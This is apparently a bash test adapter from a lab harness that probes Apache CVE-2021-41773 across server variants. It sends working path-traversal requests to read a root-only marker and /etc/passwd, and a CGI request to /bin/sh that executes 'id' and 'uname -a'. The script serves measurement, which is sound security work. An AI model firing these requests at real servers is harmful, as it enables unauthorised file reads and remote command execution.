#!/usr/bin/env bash
# CVE-2021-41773 三轴适配器：越界读 root-only 标记 / 命令执行 / 执行身份
# 退出码：0=正常观测（axes 有效），3=环境问题
# 环境变量（runner 注入）：QW9_BASE_URL QW9_OUT_DIR QW9_MARKER_REL
set -u
BASE="${QW9_BASE_URL:?}" OUT="${QW9_OUT_DIR:?}" REL="${QW9_MARKER_REL:?}"
mkdir -p "$OUT"
TRAV="/icons/.%2e/.%2e/.%2e/.%2e"

# 轴1：越界读取 root-only 标记（0600 root；V1=root 可读 / V3=httpd-v3 应 403）
code=$(curl -sS --path-as-is -o "$OUT/marker_read.body" -w '%{http_code}' \
  "$BASE$TRAV/$REL" 2>"$OUT/marker_read.err") || code=000
grep -aq 'QW9_ROOT_ONLY_MARKER' "$OUT/marker_read.body" 2>/dev/null && out_of_bound_read=1 || out_of_bound_read=0
[ "$code" = "403" ] && marker_denied=1 || marker_denied=0

# 轴1b：world-readable 的 /etc/passwd（业务/环境属性轴，预期三变体都可读，不作为差异证据）
curl -sS --path-as-is -o "$OUT/passwd_read.body" \
  "$BASE$TRAV/etc/passwd" 2>"$OUT/passwd_read.err" || true
grep -aq 'root:x:0:0' "$OUT/passwd_read.body" 2>/dev/null && passwd_read=1 || passwd_read=0

# 轴2/3：CGI 执行与执行身份（穿越到 /bin/sh；V1 预期 uid=0(root)，V3 预期 httpd-v3）
curl -sS -i --path-as-is -o "$OUT/rce.body" \
  --data-binary $'echo Content-Type: text/plain\necho\nid\nuname -a' \
  "$BASE/cgi-bin$TRAV/bin/sh" 2>"$OUT/rce.err" || true
grep -aq 'uid=' "$OUT/rce.body" 2>/dev/null && command_executed=1 || command_executed=0
exec_user="$(grep -ao 'uid=[^ ]*([A-Za-z0-9_-]*)' "$OUT/rce.body" 2>/dev/null | head -1)"
[ -n "$exec_user" ] || exec_user="none"
[ "$exec_user" = "uid=0(root)" ] && exec_user_root=1 || exec_user_root=0

echo "out_of_bound_read=$out_of_bound_read"
echo "marker_denied=$marker_denied"
echo "passwd_read=$passwd_read"
echo "command_executed=$command_executed"
echo "exec_user=$exec_user"
echo "exec_user_root=$exec_user_root"
echo "marker_http_code=$code"
exit 0
